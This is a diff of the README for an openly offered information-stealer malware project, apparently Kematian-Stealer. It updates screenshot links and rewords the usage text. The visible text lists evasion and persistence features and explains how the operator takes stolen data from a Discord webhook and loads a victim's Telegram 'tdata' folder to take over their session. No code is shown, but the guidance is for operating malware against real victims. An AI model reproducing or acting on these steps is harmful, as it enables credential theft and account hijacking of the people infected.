@@ -73,9 +73,9 @@ $persistence = $true
  - [x] 💉 Pump/Inject the output exe file with `zero-filled` bytes 
 
  ## 🔷 Webhook Data
-> ![screenshot](https://github.com/Chainski/Kematian-Stealer/assets/96607632/15a60c24-bd99-47ce-8ae8-d87b8b531ff4)
+> ![screenshot](https://github.com/Chainski/Kematian-Stealer/assets/96607632/a5a58ec8-0138-45c8-b4f2-c1f9e7dde39b)
 
-> ![webhook](https://github.com/Chainski/Kematian-Stealer/assets/96607632/834a525a-0ed4-433c-a16e-8e4cbe9084c3)
+> ![webhook](https://github.com/Chainski/Kematian-Stealer/assets/96607632/ab50d0af-bcb8-4e1d-9fee-eaf2263cc40e)
 
 #  Features
 - [x] GUI Builder
@@ -130,7 +130,7 @@ $persistence = $true
 - [x] Self-Destructs After Execution (optional)
 
 ### Telegram Session Stealer Usage :
-After the exfiltrated data is uploaded to your discord webhook, download the compressed file `Kematian.zip`, extract it on your PC, inside that folder there will also be another subfolder `Messaging Sessions` , inside this subfolder you will find the `Telegram` folder.
+After the exfiltrated data is uploaded to your discord webhook, download the zip file and extract it on your PC, inside that folder there will also be another subfolder `Messaging Sessions` , inside this subfolder you will find the `Telegram` folder.
 Now, copy the `tdata` folder from `Telegram` folder and paste it in the directory below:
 
 `
